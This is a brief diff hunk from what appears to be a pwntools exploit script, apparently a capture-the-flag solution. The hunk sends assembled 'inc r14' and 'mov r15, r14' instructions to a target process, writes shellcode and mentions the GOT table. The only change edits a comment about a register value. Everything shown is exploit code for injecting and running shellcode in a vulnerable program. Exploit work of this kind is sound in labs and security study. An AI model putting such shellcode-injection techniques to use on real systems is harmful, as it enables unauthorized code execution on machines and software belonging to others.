@@ -53,7 +53,7 @@ inst = asm('inc r14') + ret                 # "\x49\xff\xc6"
 for i in range(0x80):
     p.send(inst)
 
-p.send(asm('mov r15, r14') + ret)           # "\x4d\x89\xf7"; r14 = r15 = 0x*******70
+p.send(asm('mov r15, r14') + ret)           # "\x4d\x89\xf7"; r14 = r15 = 0x*******80
 
 writeByteString(shellcode)
 # r13 -> Addr GOT Table
